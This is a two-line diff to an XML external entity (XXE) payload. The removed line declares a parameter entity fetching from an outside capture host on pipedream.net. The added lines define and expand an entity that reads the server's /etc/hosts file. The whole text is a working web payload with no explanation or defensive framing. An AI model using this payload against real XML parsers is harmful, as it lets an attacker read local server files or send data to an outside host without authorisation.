@@ -1,1 +1,2 @@
-<!ENTITY % file SYSTEM "https://eoz55dzhhe7asus.m.pipedream.net/wow/">
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+%file;
